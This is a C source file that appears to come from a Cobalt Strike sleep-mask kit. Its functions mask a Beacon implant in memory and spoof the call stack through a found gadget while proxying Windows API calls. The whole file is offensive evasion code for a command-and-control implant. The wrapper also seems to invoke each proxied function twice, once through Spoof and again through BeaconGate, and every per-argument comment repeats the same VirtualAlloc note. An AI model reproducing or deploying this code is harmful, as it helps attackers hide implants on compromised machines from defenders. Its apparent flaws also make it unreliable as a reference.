#include <windows.h>

#include "../beacon.h"
#include "../base/helpers.h"
#include "../debug.h"
#include "../sleepmask.h"
#include "../sleepmask-vs.h"
#include "../spoof.h"

/**
* A wrapper around BeaconGate to handle masking/unmasking Beacon
*
* @param info A pointer to a SLEEPMASK_INFO structure
* @param functionCall A pointer to a FUNCTION_CALL structure
*/
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
    //DFR_LOCAL(KERNEL32, Sleep);
    STACK_CONFIG Config_1;
    UINT64 pGadget;

    pGadget = FindGadget();

    if (functionCall->bMask == TRUE) {
        MaskBeacon(&info->beacon_info);
    }

    // If the function has 1 argument (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 1) {        
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0]);
        Spoof(&Config_1);
    }

    // If the function has 2 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 2) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1]);
        Spoof(&Config_1);
    }

    // If the function has 3 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 3) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2]);
        Spoof(&Config_1);
    }

    // If the function has 4 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 4) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3]);
        Spoof(&Config_1);
    }

    // If the function has 5 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 5) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4]);
        Spoof(&Config_1);
    }

    // If the function has 6 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 6) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5]);
        Spoof(&Config_1);
    }

    // If the function has 7 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 7) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5], functionCall->args[6]);
        Spoof(&Config_1);
    }

    // If the function has 8 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 8) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5], functionCall->args[6], functionCall->args[7]);
        Spoof(&Config_1);
    }

    // If the function has 9 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 9) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5], functionCall->args[6], functionCall->args[7], functionCall->args[8]);
        Spoof(&Config_1);
    }

    // If the function has 10 arguments (could be VirtualAlloc for example)
    if (functionCall->numOfArgs == 10) {
        SetupConfig((PVOID)pGadget, &Config_1, functionCall->functionPtr, functionCall->numOfArgs, functionCall->args[0], functionCall->args[1], functionCall->args[2], functionCall->args[3], functionCall->args[4], functionCall->args[5], functionCall->args[6], functionCall->args[7], functionCall->args[8], functionCall->args[9]);
        Spoof(&Config_1);
    }
    
    BeaconGate(functionCall);

    if (functionCall->bMask == TRUE) {
        UnMaskBeacon(&info->beacon_info);
    }

    return;
}

/**
* Execute BeaconGate.
*
* @param functionCall A pointer to a FUNCTION_CALL structure
*/
void BeaconGate(PFUNCTION_CALL functionCall) {
    ULONG_PTR retValue = 0;
    
    /** 
    * Call appropriate function pointer based on number of args.
    *
    * Note: This is not a switch statement because it adds linker
    * errors. 
    */
    if (functionCall->numOfArgs == 0) {
        retValue = beaconGate(00)();
    }
    else if (functionCall->numOfArgs == 1) {
        retValue = beaconGate(01)(arg(0));
    }
    else if (functionCall->numOfArgs == 2) {
        retValue = beaconGate(02)(arg(0), arg(1));
    }
    else if (functionCall->numOfArgs == 3) {
        retValue = beaconGate(03) (arg(0), arg(1), arg(2));
    }
    else if (functionCall->numOfArgs == 4) {
        retValue = beaconGate(04) (arg(0), arg(1), arg(2), arg(3));
    }
    else if (functionCall->numOfArgs == 5) {
        retValue = beaconGate(05) (arg(0), arg(1), arg(2), arg(3), arg(4));
    }
    else if (functionCall->numOfArgs == 6) {
        retValue = beaconGate(06) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5));
    }
    else if (functionCall->numOfArgs == 7) {
        retValue = beaconGate(07) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6));
    }
    else if (functionCall->numOfArgs == 8) {
        retValue = beaconGate(08) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7));
    }
    else if (functionCall->numOfArgs == 9) {
        retValue = beaconGate(09) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8));
    }
    else if (functionCall->numOfArgs == 10) {
        retValue = beaconGate(10) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8), arg(9));
    }

    functionCall->retValue = retValue;

    return;
}
